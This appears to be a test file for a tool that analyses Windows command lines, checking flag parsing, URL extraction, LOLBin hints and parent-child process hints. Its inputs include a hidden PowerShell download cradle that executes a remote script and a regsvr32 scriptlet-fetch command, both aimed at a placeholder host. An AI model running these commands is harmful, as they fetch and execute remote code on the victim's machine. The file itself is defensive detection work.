import { describe, expect, it } from 'vitest'
import { analyzeCommandLine } from './cmdline'

describe('Windows command-line analysis', () => {
  it('analyzes a PowerShell download cradle', () => {
    const result = analyzeCommandLine(`powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')"`)
    expect(result.executable).toBe('powershell.exe')
    expect(result.flags.map((flag) => flag.explanation)).toEqual(expect.arrayContaining(['noProfile', 'windowStyle', 'command']))
    expect(result.indicators.groups.find((group) => group.type === 'url')?.entries[0]?.value).toBe('http://x.example/a.ps1')
  })

  it('recognizes a regsvr32 LOLBin and URL', () => {
    const result = analyzeCommandLine('regsvr32 /s /n /u /i:http://x.example/file.sct scrobj.dll')
    expect(result.lolbinHints.some((hint) => hint.reason === 'regsvr32')).toBe(true)
    expect(result.indicators.groups.find((group) => group.type === 'url')?.entries[0]?.value).toBe('http://x.example/file.sct')
  })

  it('decodes an inline EncodedCommand through the PowerShell decoder', () => {
    const encoded = Buffer.from("Write-Output 'hello'", 'utf16le').toString('base64')
    expect(analyzeCommandLine(`powershell.exe -enc ${encoded}`).decodedScript).toBe("Write-Output 'hello'")
  })

  it('detects environment variables and cmd /c', () => {
    const result = analyzeCommandLine('cmd /c "%COMSPEC% /c echo %USERNAME%"')
    expect(result.environmentVariables).toEqual(['%COMSPEC%', '%USERNAME%'])
    expect(result.flags.some((flag) => flag.explanation === 'cmdRunClose')).toBe(true)
  })

  it('parses a quoted executable path containing spaces', () => {
    const result = analyzeCommandLine('"C:\\Program Files\\PowerShell\\7\\pwsh.exe" -NoProfile -Command whoami')
    expect(result.executable).toBe('C:\\Program Files\\PowerShell\\7\\pwsh.exe')
    expect(result.arguments[0]).toBe('-NoProfile')
  })

  it('adds an informative parent-child hint', () => {
    const result = analyzeCommandLine('powershell.exe -nop -c whoami', 'winword.exe')
    expect(result.parentChildHints).toEqual([{ name: 'winword.exe → powershell.exe', reason: 'officeInterpreter' }])
  })

  it('handles caret and backtick escapes on a best-effort basis', () => {
    expect(analyzeCommandLine('cmd.exe /c echo one^ two').arguments).toEqual(['/c', 'echo', 'one two'])
    expect(analyzeCommandLine('powershell.exe -c Write`-Output').arguments).toEqual(['-c', 'Write-Output'])
  })
})
